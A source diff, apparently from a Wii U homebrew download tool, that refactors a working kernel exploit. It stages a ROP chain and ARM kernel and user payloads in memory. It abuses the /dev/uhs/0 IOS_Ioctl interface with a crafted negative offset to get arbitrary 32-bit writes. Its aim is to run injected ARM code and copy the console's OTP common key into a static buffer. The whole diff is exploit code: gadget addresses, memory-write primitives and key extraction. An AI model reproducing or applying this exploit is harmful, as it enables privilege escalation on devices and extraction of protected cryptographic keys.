@@ -36,18 +36,22 @@
 #define ARM_CODE_BASE       0x08134100
 #define REPLACE_SYSCALL     0x081298BC
 
+#define ADDY_SC ((uint8_t *)0xF4120000)
+#define ADDY_FC (ADDY_SC + 0x00010000)
+#define ADDY_AK (ADDY_FC + 0x00010000)
+#define ADDY_AU (ADDY_AK + 0x00008000)
 
 /* YOUR ARM CODE HERE (starts at ARM_CODE_BASE) */
 #include <arm_kernel_bin.h>
 #include <arm_user_bin.h>
 
 //!------Variables used in exploit------
-int *pretend_root_hub = (int*)0xF5003ABC;
-int *ayylmao = (int*)0xF4500000;
+static int *pretend_root_hub = (int*)0xF5003ABC;
+static int *ayylmao = (int*)0xF4500000;
 //!-------------------------------------
 
 /* ROP CHAIN STARTS HERE (0x1015BD78) */
-int final_chain[] = {
+static const int final_chain[] = {
    0x101236f3,        // 0x00      POP {R1-R7,PC}
    0x0,               // 0x04      arg
    0x0812974C,        // 0x08      stackptr     CMP R3, #1; STREQ R1, [R12]; BX LR
@@ -260,7 +264,7 @@ int final_chain[] = {
    0x101312D0,
 };
 
-int second_chain[] = {
+static const int second_chain[] = {
    0x10123a9f, // 0x00         POP {R0,R1,R4,PC}
    CHAIN_START + 0x14 + 0x4 + 0x20 - 0xF000,     // 0x04         destination
    0x0,        // 0x08
@@ -314,60 +318,57 @@ int second_chain[] = {
 };
 
 static uint8_t otp_common_key[16] = { 0x00 };
-static int request_buffer[2] = { -(0xBEA2C), 0 };
 
 static inline void uhs_exploit_init()
 {
 	ayylmao[5] = 1;
 	ayylmao[8] = 0x500000;
 
+	// Write data into PPC cache
 	pretend_root_hub[33] = 0x500000;
 	pretend_root_hub[78] = 0;
+	OSBlockMove(ADDY_SC, second_chain, sizeof(second_chain), false);
+	OSBlockMove(ADDY_FC, final_chain, sizeof(final_chain), false);
+	OSBlockMove(ADDY_AK, arm_kernel_bin, sizeof(arm_kernel_bin), false);
+	OSBlockMove(ADDY_AU, arm_user_bin, sizeof(arm_user_bin), false);
 
-	DCFlushRange(pretend_root_hub + 33, 200);	// Push data out of PPC cache to RAM
-
-    uint8_t *ptr = (uint8_t *)0xF4120000;
-	OSBlockMove(ptr, second_chain, sizeof(second_chain), false);
-	DCFlushRange(ptr, sizeof(second_chain));
-    ptr += 0x00010000;
-	OSBlockMove(ptr, final_chain, sizeof(final_chain), false);
-	DCFlushRange(ptr, sizeof(final_chain));
-    ptr += 0x00010000;
-	OSBlockMove(ptr, arm_kernel_bin, sizeof(arm_kernel_bin), false);
-	DCFlushRange(ptr, sizeof(arm_kernel_bin));
-    ptr += 0x00008000;
-	OSBlockMove(ptr, arm_user_bin, sizeof(arm_user_bin), false);
-	DCFlushRange(ptr, sizeof(arm_user_bin));
+	// Push data out of PPC cache to RAM
+	DCFlushRange(ayylmao + 5, 4);
+	DCFlushRange(ayylmao + 8, 4);
+	DCFlushRange(pretend_root_hub + 33, 200);
+	DCFlushRange(ADDY_SC, sizeof(second_chain));
+	DCFlushRange(ADDY_FC, sizeof(final_chain));
+	DCFlushRange(ADDY_AK, sizeof(arm_kernel_bin));
+	DCFlushRange(ADDY_AU, sizeof(arm_user_bin));
 }
 
-static int uhs_write32(int arm_addr, int val, int uhs)
+static void uhs_write32(int *buffer, int arm_addr, int val, int uhs)
 {
 	ayylmao[520] = arm_addr - 24;			// The address to be overwritten, minus 24 bytes
-	DCFlushRange(ayylmao, 521 * 4);			// Push data out of PPC cache to RAM
+	DCFlushRange(ayylmao + 520, 4);			// Push data out of PPC cache to RAM
 	OSSleepTicks(0x200000);					// Improves stability
-	request_buffer[1] = val;				// -(0xBEA2C) gets IOS_USB to read from the middle of MEM1
-	int output_buffer[32];
-	return IOS_Ioctl(uhs, 0x15, request_buffer, sizeof(request_buffer), output_buffer, sizeof(output_buffer));
+	buffer[0] = -(0xBEA2C);
+	buffer[1] = val;
+	IOS_Ioctl(uhs, 0x15, buffer, 2, buffer, 32);
 }
 
 uint8_t *getCommonKey()
 {
 	if(otp_common_key[0] == 0x00)
 	{
-        int uhs = IOS_Open("/dev/uhs/0", 0);	// Open /dev/uhs/0 IOS node
+		int uhs = IOS_Open("/dev/uhs/0", 0);	// Open /dev/uhs/0 IOS node
 		uhs_exploit_init();						// Init variables for the exploit
 												//------ROP CHAIN-------
-		uhs_write32(CHAIN_START + 0x14, CHAIN_START + 0x14 + 0x4 + 0x20, uhs);
-		uhs_write32(CHAIN_START + 0x10, 0x1011814C, uhs);
-		uhs_write32(CHAIN_START + 0xC, SOURCE, uhs);
+		int buffer[32];
+		uhs_write32(buffer, CHAIN_START + 0x14, CHAIN_START + 0x14 + 0x4 + 0x20, uhs);
+		uhs_write32(buffer, CHAIN_START + 0x10, 0x1011814C, uhs);
+		uhs_write32(buffer, CHAIN_START + 0xC, SOURCE, uhs);
 
-		uhs_write32(CHAIN_START, 0x1012392b, uhs); // pop {R4-R6,PC}
-
-		void *armHackAddr = (void *)(0xF412F000 - 16);
-		DCInvalidateRange(armHackAddr, 16); // invalidate PPC cache / get data from RAM
-		OSBlockMove(&otp_common_key[0], armHackAddr, 16, false);
-
+		uhs_write32(buffer, CHAIN_START, 0x1012392b, uhs); // pop {R4-R6,PC}
 		IOS_Close(uhs);
+
+		DCInvalidateRange(ADDY_AU, 16); // invalidate PPC cache / get data from RAM
+		OSBlockMove(&otp_common_key[0], ADDY_AU, 16, false);  // Copy common key from transient to static addy
 		
 #ifdef NUSSPLI_DEBUG
 		char ret[33];
